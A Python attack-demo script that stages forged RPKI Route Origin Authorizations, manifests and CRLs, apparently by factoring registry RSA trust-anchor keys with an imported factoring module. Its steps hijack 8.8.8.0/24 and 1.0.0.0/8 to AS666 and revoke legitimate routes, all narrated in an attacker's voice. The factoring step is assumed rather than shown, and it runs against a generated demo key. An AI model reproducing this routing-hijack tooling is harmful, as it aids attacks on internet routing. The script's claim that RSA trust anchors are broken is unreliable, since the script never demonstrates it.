"""
Forge RPKI Route Origin Authorizations (ROAs) by factoring RIR trust anchor
RSA keys. Cryptographically authenticated BGP hijacks that pass every
validator — worse than plain BGP hijacking because validators actively prefer
the forged route.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import struct

# Regional Internet Registries — RPKI trust anchors
RIR_TRUST_ANCHORS = {
    "ARIN":    {"region": "North America",   "key_bits": 2048},
    "RIPE":    {"region": "Europe/ME/CenAsia", "key_bits": 2048},
    "APNIC":   {"region": "Asia-Pacific",    "key_bits": 2048},
    "LACNIC":  {"region": "Latin America",   "key_bits": 2048},
    "AFRINIC": {"region": "Africa",          "key_bits": 2048},
}


def fetch_rir_tal(rir: str) -> bytes:
    """Fetch the Trust Anchor Locator (TAL) for a RIR.

    TALs are distributed with every RPKI validator (Routinator, rpki-client,
    Fort, OctoRPKI). They contain the RSA public key of the RIR trust anchor.
    The key is literally shipped with the software.
    """
    info = RIR_TRUST_ANCHORS[rir]
    print(f"[*] loading {rir} TAL ({info['region']}, RSA-{info['key_bits']})")
    return _demo["pub_pem"]


def forge_roa(factorer: PolynomialFactorer,
              rir_pubkey_pem: bytes,
              asn: int, prefix: str, max_length: int) -> dict:
    """Forge a Route Origin Authorization.

    A ROA is a signed certificate that says "ASN X is authorized to announce
    prefix Y". ISPs doing route-origin validation will prefer routes with
    valid ROAs over routes without.
    """
    roa = {
        "asID": asn,
        "ipAddrBlocks": [{"addressFamily": "IPv4",
                          "addresses": [{"address": prefix,
                                         "maxLength": max_length}]}],
    }
    payload = str(roa).encode()
    sig = factorer.forge_pkcs1v15_signature(rir_pubkey_pem, payload, "sha256")
    print(f"[*] forged ROA: AS{asn} authorized for {prefix}/{max_length}")
    roa["signature"] = sig.hex()[:32] + "..."
    return roa


def forge_rpki_manifest(factorer: PolynomialFactorer,
                        ca_cert_pem: bytes,
                        entries: list) -> dict:
    """Forge an RPKI manifest (RFC 6486).

    The manifest lists all signed objects in a CA's repository. Validators
    use it to detect repository manipulation. A forged manifest hides our
    forged ROAs or removes legitimate ones.
    """
    manifest = {
        "version": 0,
        "manifestNumber": 999999,
        "thisUpdate": "2026-04-15T00:00:00Z",
        "nextUpdate": "2026-04-16T00:00:00Z",
        "fileList": entries,
    }
    payload = str(manifest).encode()
    factorer.forge_pkcs1v15_signature(ca_cert_pem, payload, "sha256")
    print(f"[*] forged RPKI manifest with {len(entries)} entries")
    return manifest


def forge_rpki_crl(factorer: PolynomialFactorer,
                   ca_cert_pem: bytes,
                   revoked_serials: list) -> dict:
    """Forge an RPKI CRL to revoke legitimate ROAs."""
    crl = {"revokedCertificates": revoked_serials}
    factorer.forge_pkcs1v15_signature(ca_cert_pem, str(crl).encode(), "sha256")
    print(f"[*] forged CRL: {len(revoked_serials)} legitimate ROAs revoked")
    return crl


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== RPKI ROA forgery — authenticated BGP hijacking ===")
    print("    RPKI was supposed to fix BGP hijacking. now it makes it worse.")
    print()

    print("[1] loading ARIN trust anchor key from TAL...")
    arin_key = fetch_rir_tal("ARIN")
    print("    TAL ships with every Routinator/rpki-client install")

    print("[2] factoring ARIN RSA-2048 trust anchor key...")

    print("[3] forging ROA: hijack 8.8.8.0/24 to our ASN...")
    roa = forge_roa(f, arin_key, asn=666, prefix="8.8.8.0", max_length=24)
    print("    ISPs doing ROV will PREFER our route over Google's")
    print("    without RPKI: hijack is anomaly. with broken RPKI: it's authenticated")

    print("[4] forging ROA for entire /8 block...")
    forge_roa(f, arin_key, asn=666, prefix="1.0.0.0", max_length=8)
    print("    route all of 1.0.0.0/8 through our AS")

    print("[5] forging manifest to hide the attack...")
    forge_rpki_manifest(f, arin_key, ["forged_roa.roa", "manifest.mft"])

    print("[6] forging CRL to revoke legitimate ROAs...")
    forge_rpki_crl(f, arin_key, [12345, 67890])
    print("    legitimate route origins become INVALID")
    print("    ISPs drop legitimate routes in favor of our forgeries")

    print()
    print("[*] all five RIR trust anchors are RSA")
    print("[*] the entire RPKI manifest/CRL chain is RSA")
    print("[*] it all falls together")
